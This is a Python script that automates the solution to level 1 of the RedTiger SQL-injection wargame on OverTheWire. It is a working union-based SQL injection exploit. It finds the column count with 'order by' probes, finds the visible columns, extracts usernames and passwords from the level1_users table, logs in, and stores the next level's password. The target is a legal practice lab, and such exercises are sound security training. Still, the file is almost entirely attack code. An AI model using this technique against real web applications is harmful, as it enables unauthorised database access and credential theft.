#!/usr/bin/env python3
import difflib
import pickle
import tigers as tg


def count_columns(url: str) -> int:
    max_columns = 10
    html_responce_1 = ''
    for i in range(1, max_columns):
        param = dict(cat=f"1 order by {i}")
        html_responce_2 = tg.get_request(url, param)
        for s in difflib.ndiff(html_responce_2, html_responce_1):
            if i > 1 and ('+' in s[0] or '-' in s[0]):
                return i - 1
            html_responce_1 = html_responce_2
    print('num of columns not find')
    exit(1)


def find_visible_columns(url: str, base_name: str,
                         list_of_columns: list) -> list:
    list_of_visible = []
    param = dict(
        cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
    html_responce = tg.get_request(url, param)
    # find differens
    param = dict(cat=f"-1")
    html_base = tg.get_request(url, param)
    for s in difflib.ndiff(html_responce, html_base):
        if s[0] == ' ':
            continue
        elif s[0] == '-':
            try:
                if int(s[-1]) in range(len(list_of_columns) + 1):
                    list_of_visible.append(int(s[-1]))
            except:
                continue
    if not list_of_visible:
        print('not find visible column')
        exit(1)
    return [list_of_visible, html_responce]


def find_param(url: str, base_name: str, list_of_columns: list,
               list_of_visible: list, find: list, html_visible: str) -> list:
    if len(find) <= len(list_of_visible):
        for i, f in enumerate(find):
            list_of_columns[int(list_of_visible[i]) - 1] = f
        param = dict(
            cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
        html_responce = tg.get_request(url, param)
        # find differens
        n = -1
        key = [''] * len(find)
        for s in difflib.ndiff(html_responce, html_visible):
            if s[0] == ' ':
                continue
            elif s[0] == '-':
                key[n] += s[-1]
            elif s[0] == '+':
                n += 1
        return key
    else:
        # todo
        print('too small visible list')
        exit(1)


def main():
    url = "https://redtiger.labs.overthewire.org/level1.php"
    base_name = 'level1_users'
    finds = ['username', 'password']  # what we are finding
    pass_r = 'The password for the next level is: '

    columns = count_columns(url)
    list_of_columns = [str(c + 1) for c in range(columns)]
    list_of_visible, html_visible = find_visible_columns(
        url, base_name, list_of_columns)

    keys = find_param(url, base_name, list_of_columns,
                      list_of_visible, finds, html_visible)
    print(keys)

    data = dict(user=keys[0], password=keys[1], login='Login')
    response = tg.get_request(url, data, method='post')
    passw = tg.extract_pass(response).replace(pass_r, '')
    print('password:', passw)

    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if ('level2login' not in cooks) or (cooks['level2login'] != passw):
            cooks['level2login'] = passw
            tg.save_cookies(cooks)
    except:
        cooks = dict(level2login=passw)
        tg.save_cookies(cooks)


if __name__ == '__main__':
    main()
